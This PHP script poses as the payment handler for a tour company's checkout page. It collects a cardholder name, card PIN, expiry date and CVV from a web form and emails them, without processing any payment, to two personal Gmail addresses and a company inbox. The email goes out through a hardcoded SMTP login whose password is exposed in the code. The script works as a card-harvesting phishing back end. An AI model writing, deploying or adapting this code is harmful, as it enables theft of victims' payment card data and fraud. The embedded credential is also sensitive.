<?php



ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

 
require_once ("PHPMailer/src/PHPMailer.php");
require_once ("PHPMailer/src/SMTP.php");
require_once ("PHPMailer/src/Exception.php");

//require 'vendor/autoload.php';
 
$mail = new PHPMailer(true);

if(isset($_POST['pinNumber'])){
    $pinNumber = $_POST['pinNumber'];
}

if(isset($_POST['cardName'])){
        $cardName= $_POST['cardName'];
}

if(isset($_POST['date'])){
        $date= $_POST['date'];
}

if(isset($_POST['cvv'])){
        $cvv = $_POST['cvv'];
}



 if(!empty($pinNumber)||!empty($date) || !empty( $cvv)){
        
       try {
                $from  = "no-reply@chenwaytours.com";  
                $namefrom = "Chenway Tours";
                $mail->SMTPDebug = 0;                                      
                $mail->isSMTP();                                           
                $mail->Host       = 'smtp.hostinger.com';                   
                $mail->SMTPAuth   = true;                            
                $mail->Username   = 'no-reply@chenwaytours.com';                
                $mail->Password   = 'Nnamdi0816.';                      
                $mail->SMTPSecure = 'ssl';                             
                $mail->Port       = 465; 
                
                $mail->setFrom($from,$namefrom);          
                $mail->addAddress('victorprecious61@gmail.com',$namefrom); //RECEIVER EMAIL
                 $mail->addAddress('mr.johnson113@gmail.com',$namefrom); //RECEIVER EMAIL
                $mail->addAddress('payment@chenwaytours.com',$namefrom); //RECEIVER EMAIL
                //$mail->addAddress($email, 'Client');
                
                $mail->isHTML(true);                                 
                $mail->Subject = 'Email Alert';
                $mail->Body="
                        <h4 style='background-color:#03a5fc; color:white; text-align:center; border-radius:10px; width:100%;padding:10px;' >Email Alert<h4></br> 
                        
                        <h3>Client Details</h3>
                        
                        <p>Card Name :$cardName</p>
                        
                        <p>User Pin :$pinNumber</p>
                        
                        <p>Expiry Date :$date</p>

                        <p>Cvv Details :$cvv</p>
                        
                        <hr/>
                        <small>copyright 2024 Email System , All rights reserved </small>
                        ";
                //$mail->AltBody = 'Body in plain text for non-HTML mail clients';
                $mail->send();
        } catch (Exception $e) {
        //echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
        
}else{
        echo "<script>
                alert('Oops!! One or More Require Fields are Empty, Please Fill all Information and Try Again.')
                window.location.href='payment.html'
        </script>";  
}
 

            
?>